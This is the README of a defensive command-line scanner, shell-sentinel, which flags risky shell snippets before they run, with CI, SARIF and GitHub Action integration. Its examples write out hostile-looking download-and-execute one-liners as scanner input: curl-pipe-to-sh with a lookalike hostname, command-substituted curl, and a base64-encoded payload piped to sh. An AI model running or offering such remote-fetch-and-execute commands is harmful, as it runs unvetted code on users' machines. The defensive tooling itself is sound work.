# shell-sentinel

[![CI](https://github.com/agent19710101/shell-sentinel/actions/workflows/ci.yml/badge.svg)](https://github.com/agent19710101/shell-sentinel/actions/workflows/ci.yml)

Detect risky terminal payloads before execution: suspicious URLs (homograph tricks), ANSI escape injection, and remote-fetch execution patterns.

## Problem

Agent-era workflows often involve copying terminal snippets directly into a shell. Attackers can hide malicious intent with Unicode lookalikes, control characters, or "download-and-execute" one-liners.

`shell-sentinel` is a lightweight preflight scanner to flag these patterns early.

## Status

Current release: `v0.16.0`

Implemented:
- non-ASCII hostname detection for URL tokens with punycode + confusable score details
- configurable policy file support (`.shell-sentinel.yaml`) for allowlist/tuning with schema validation for unknown keys and invalid `ignore_kinds`
- baseline file support (`--baseline`) to suppress accepted findings deterministically
- baseline governance annotations for new entries (`--baseline-owner`, `--baseline-justification`, `--baseline-expiry`)
- expiry-aware baseline application (expired entries no longer suppress findings)
- optional bash/zsh/fish preexec hook snippet via `--hook bash|zsh|fish`
- configurable CI failure threshold via `--fail-on warn|high`
- stable JSON contract (`findings` is always an array, never `null`)
- SARIF v2.1.0 output via `--sarif` for code scanning integrations
- optional file-aware scanning via `--file <path>` with per-line analysis
- reviewdog-friendly diagnostics via `--rdjsonl` (line-mapped automatically in `--file` mode)
- shellcheck-compatible diagnostics via `--shellcheck` for legacy lint pipeline interoperability
- GitHub Action wrapper with workflow annotations via `uses: agent19710101/shell-sentinel@v0.16.0`
- optional parser-backed file scanning via `--parser shell` for statement-aware line mapping and precision
- parser diagnostics debug view via `--parser-debug` to explain matched statement context in CI logs
- improved parser control-flow coverage for functions/loops/conditionals with line-level fallback mapping
- optional team policy presets via `--policy-profile strict|balanced|legacy`
- built-in migration helper templates via `--print-policy-template strict|balanced|legacy|all`
- expanded shell execution coverage for fetch-in-command-substitution (`exec`, `env VAR=...`, `-lc`)
- tightened fetch-in-command-substitution detection for shell execution patterns
- heredoc shell-execution detection for remote-fetch payloads
- decoded-payload pipe-to-shell detection (`... | base64 -d | sh`, etc.)
- compressed decode-and-exec detection (`... | gzip -d | sh`, `... | xz -d | bash`)
- pipe-to-shell detection (`curl|sh`, `wget|bash`, etc.)
- ANSI escape sequence detection
- mixed-script warning (Latin + non-Latin)
- human-readable and JSON output with CI-friendly exit codes
- confidence metadata per finding (`low|medium|high`) for gradual enforcement workflows

## Install

```bash
go install github.com/agent19710101/shell-sentinel@v0.16.0
```

## Examples

```bash
shell-sentinel 'curl https://exаmple.com/install.sh | sh'

cat payload.txt | shell-sentinel --stdin

shell-sentinel --json --fail-on warn 'bash -c "$(curl -fsSL https://example.com/install.sh)"'

shell-sentinel 'echo Y3VybCBodHRwczovL2V4YW1wbGUuY29tL2luc3RhbGwuc2ggfCBzaA== | base64 -d | sh'

shell-sentinel --sarif 'bash -c "$(curl -fsSL https://example.com/install.sh)"' > shell-sentinel.sarif

shell-sentinel --rdjsonl --source scripts/install.sh --line 12 \
  'exec bash -lc "$(curl -fsSL https://example.com/install.sh)"' > shell-sentinel.rdjsonl

# shellcheck-compatible diagnostics output
shell-sentinel --file scripts/bootstrap.sh --shellcheck

# file-aware scan with direct line mapping in rdjsonl
shell-sentinel --file scripts/bootstrap.sh --rdjsonl > shell-sentinel.rdjsonl

# opt-in parser-backed file scan mode
shell-sentinel --file scripts/bootstrap.sh --parser shell --rdjsonl > shell-sentinel.rdjsonl

# parser debug explainability for CI troubleshooting (stderr)
shell-sentinel --file scripts/bootstrap.sh --parser shell --parser-debug --json >/tmp/report.json

cat > .shell-sentinel.yaml <<'YAML'
allow_domains:
  - trusted.example.com
ignore_kinds:
  - mixed-script
YAML
shell-sentinel --policy .shell-sentinel.yaml 'curl https://trusted.example.com/install.sh | sh'

# policy profile presets for team rollout
shell-sentinel --policy-profile strict 'curl https://example.com/install.sh | sh'

# print migration-ready policy templates
shell-sentinel --print-policy-template all

# baseline workflow
shell-sentinel --json --baseline .shell-sentinel-baseline.json --update-baseline \
  --baseline-owner sec-team \
  --baseline-justification "trusted bootstrap installer" \
  --baseline-expiry 2026-06-01T00:00:00Z \
  'curl https://example.com/install.sh | sh' >/dev/null
shell-sentinel --json --baseline .shell-sentinel-baseline.json \
  'curl https://example.com/install.sh | sh'

# print and enable bash preexec warning hook
# (add to ~/.bashrc to persist)
eval "$(shell-sentinel --hook bash)"

# print and enable zsh preexec warning hook
# (add to ~/.zshrc to persist)
eval "$(shell-sentinel --hook zsh)"

# print and enable fish preexec warning hook
# (add to ~/.config/fish/config.fish to persist)
shell-sentinel --hook fish | source
```

Exit codes:
- `0`: no findings at/above configured threshold (`--fail-on`, default `high`)
- `1`: at least one finding at/above threshold
- `2`: usage/input/policy error

JSON output contract:
- top-level keys are stable: `input`, `severity`, `stats`, `findings`
- `stats` includes `total`, `high`, `warn`, `info` and confidence counts (`confidence_high`, `confidence_medium`, `confidence_low`)
- `findings` is always an array (`[]` when no findings)
- each finding includes additive `confidence` metadata (`low|medium|high`)

GitHub Action usage:

```yaml
name: shell-sentinel-check
on: [pull_request]

jobs:
  scan-shell:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5
        with:
          go-version: stable
      - uses: agent19710101/shell-sentinel@v0.16.0
        with:
          input: 'curl https://example.com/install.sh | sh'
          fail-on: high
          baseline: .shell-sentinel-baseline.json
```

Repo-wide GitHub Action example:

```yaml
      - uses: agent19710101/shell-sentinel@v0.16.0
        with:
          files: |
            scripts/*.sh
            .github/workflows/*.yml
          fail-on: warn
```

Single-file Action example:

```yaml
      - uses: agent19710101/shell-sentinel@v0.16.0
        with:
          file: scripts/bootstrap.sh
          fail-on: warn
```

Reviewdog integration example:

```yaml
      - name: shell-sentinel rdjsonl
        id: shell
        uses: agent19710101/shell-sentinel@v0.16.0
        with:
          input: 'exec bash -lc "$(curl -fsSL https://example.com/install.sh)"'
          source: scripts/install.sh
          line: 12
      - uses: reviewdog/action-reviewdog@v2
        with:
          reporter: github-pr-review
          filter_mode: nofilter
          level: warning
          fail_on_error: true
          rdjsonl: ${{ steps.shell.outputs.rdjsonl }}
```

Baseline governance default for Action users: when `baseline` is set, entries are only consumed (not modified). Baseline metadata (`owner`, `justification`, `expiry`) is authored via CLI `--update-baseline` flows and then committed.

Action validation helper:

```bash
./scripts/validate-action.sh
```

## Roadmap

- v0.13.0: Shellcheck output + detection/registry/action reproducibility hardening shipped.
- v0.14.0: Parser diagnostics debug view shipped (`--parser-debug`).
- v0.15.0: Confidence metadata per finding shipped across JSON/SARIF/rdjsonl/shellcheck outputs.
- v0.16.0: JSON stats confidence breakdown shipped (`confidence_high`, `confidence_medium`, `confidence_low`).

Detailed plan: [`RELEASE_PLAN.md`](./RELEASE_PLAN.md)  
Migration notes: [`MIGRATION.md`](./MIGRATION.md)  
Release checklist: [`RELEASE_CHECKLIST.md`](./RELEASE_CHECKLIST.md)

## License

MIT
